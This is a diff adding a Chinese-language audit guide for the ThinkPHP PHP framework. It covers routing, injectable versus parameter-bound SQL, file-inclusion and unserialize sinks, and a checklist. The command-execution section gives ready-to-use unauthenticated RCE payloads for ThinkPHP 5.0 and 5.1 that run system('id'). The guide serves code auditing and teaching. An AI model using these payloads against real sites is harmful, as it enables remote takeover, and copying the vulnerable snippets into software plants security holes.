@@ -1,0 +1,53 @@
+# ThinkPHP 框架审计思路
+
+## 路由与控制器
+```
+URL 格式: index.php/模块/控制器/操作/参数
+例: index.php/home/user/edit?id=1
+
+MVC 调用链:
+  路由解析 → 控制器方法 → 模型操作 → 视图渲染
+```
+
+## 常见漏洞点
+
+### 1. SQL 注入
+```php
+// 危险：直接拼接
+$user = Db::query("select * from user where id={$_GET['id']}");
+
+// 安全：参数绑定
+$user = Db::table('user')->where('id', $_GET['id'])->find();
+$user = Db::query("select * from user where id=?", [$_GET['id']]);
+```
+
+### 2. 命令执行
+```php
+// thinkphp 5.0.* RCE（无需登录）
+?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+
+// thinkphp 5.1.* RCE
+?s=index/\think\Request/input&data=id&filter=system
+```
+
+### 3. 文件包含
+```php
+$this->fetch($_GET['file']);  // 模板文件包含
+$this->display($_GET['file']); // thinkphp 3.*
+```
+
+### 4. 反序列化
+```php
+// thinkphp 可控 unserialize 入口
+unserialize(base64_decode($_GET['data']));
+// 可用 phpggc 生成链
+```
+
+## 审计关注点
+```
+1. 路由定义（route.php）—— 是否存在未授权的路由
+2. 控制器中的 input() 和 param() —— 参数获取方式
+3. 模型中的 query() 和 execute() —— 原生SQL
+4. 模板中的 fetch() 和 display() —— 文件包含
+5. 助手函数 input() —— 过滤参数
+```
